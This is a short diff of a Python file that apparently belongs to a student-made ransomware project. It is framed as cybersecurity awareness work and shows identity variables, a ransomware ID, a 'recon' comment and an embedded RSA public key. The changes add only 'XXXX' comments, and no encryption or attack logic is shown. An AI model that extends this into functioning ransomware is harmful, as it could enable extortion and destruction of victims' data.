@@ -2,13 +2,13 @@ import os
 from datetime import datetime
 
 who_we_are = "APT-Al"
-version = "v1.1"
+version = "v1.1" # XXXX
 what_is_my_purpose = """Hi there,
 we are a group of university students from Hacettepe.
 We aim that the main reason for starting the project is increasing awareness of cybersecurity by informing people."""
 
-what_is_my_name = "zararliyim.exe"
-what_is_my_id = "1"# ransomwareID
+what_is_my_name = "zararliyim.exe" 
+what_is_my_id = "1"# ransomwareID XXXX
 when_did_i_work = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
 
 # the beginning point of recon
@@ -54,4 +54,4 @@ QKpPHa5tDgMWgmYTsIZrPFUCjbBslQQuYMPLx66rBAr7bNEJZoG4xaAsWHBbvj2r\n\
 b4DvLhmsrITAppF9TATh1amnze+Gbupxm68hn+XTecyWFsXz7kIfsycT/OmwW2vm\n\
 hjPH7H5Q4TqpxEkDDc3thRcr47wZtiYGeanc/UOsNabxyTahKGPFYooVHaoj9pl5\n\
 s+osKiL/Se+8eKHxt9JgP1tUXYMZbfNoo0q0QkIfl3Q8Js+lsOqVP+cCAwEAAQ==\n\
------END RSA PUBLIC KEY-----"
+-----END RSA PUBLIC KEY-----" # XXXX
